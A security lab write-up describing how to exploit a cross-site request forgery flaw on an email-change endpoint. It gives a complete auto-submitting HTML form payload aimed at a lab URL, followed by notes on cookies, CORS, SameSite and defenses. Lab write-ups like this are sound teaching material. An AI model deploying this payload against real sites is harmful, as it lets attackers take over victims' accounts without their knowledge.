# CSRF vulnerability with no defenses

*A concise writeâ€‘up using my original steps (verbatim flow) with small, accurate notes. For authorized lab use only.*

---

## ðŸŽ¯ Goal
**Deliver a link to a victim that, when visited, changes their account email.**

---

## âœ… My Exact Steps (verbatim, lightly corrected)

1. **GOAL:** deliver a link to a victim; once pressed it will change their email address on the account.
2. Get the request endpoint for changing email: **`/my-account/change-email`**.
3. Thereâ€™s **no CSRF token** or origin check, so we can control the `email` parameter and trick the victim into sending it.
4. The client activates it via a **link to our website** (attackerâ€‘controlled page).
5. We probably **canâ€™t use XHR** due to **CORS** (victimâ€™s cookies arenâ€™t usable crossâ€‘origin in fetch/XHR).
6. So we make the victim submit a **crossâ€‘site form** that autoâ€‘submits with JS.
7. **Exploit page (host this and send the link):**
   ```html
     <!-- Autoâ€‘submitting CSRF form -->
     <form id="autoForm"
           action="https://0a9200f303dce26a80a9851300290054.web-security-academy.net/my-account/change-email"
           method="POST">
       <input type="hidden" name="email" value="abc@gmail.com">
     </form>

     <script>
       // Autoâ€‘submit as soon as the page loads
       document.getElementById("autoForm").submit();
     </script>
   ```
8. **Lab solved!** âœ…

---

## ðŸ§  Why This Works (minimal notes)

- **CSRF basics:** The target site accepts a **stateâ€‘changing POST** without CSRF defenses (no perâ€‘request token, no Origin/Referer checks). When the victimâ€™s browser loads your page, their **session cookies** for the target are **automatically sent** with the crossâ€‘site form POST, authenticating the change.
- **Why not XHR?** **CORS** prevents your JS from reading responses or sending credentials unless the target opts in. Classic CSRF uses **plain HTML forms**, which do **not** require CORS.
- **SameSite cookies:** Many labs set cookies without `SameSite` or with `SameSite=None; Secure`, so crossâ€‘site form POSTs still include cookies. If `SameSite=Lax/Strict` blocks it, youâ€™d need a topâ€‘level navigation or other techniques; this lab allows the simple form POST.
- **Hardening (defense perspective):** Use **unpredictable CSRF tokens**, verify **Origin/Referer**, and consider **SameSite=Lax/Strict** where viable.

> Keep this strictly within authorized testing scope. Do not target real users or production systems without explicit permission.
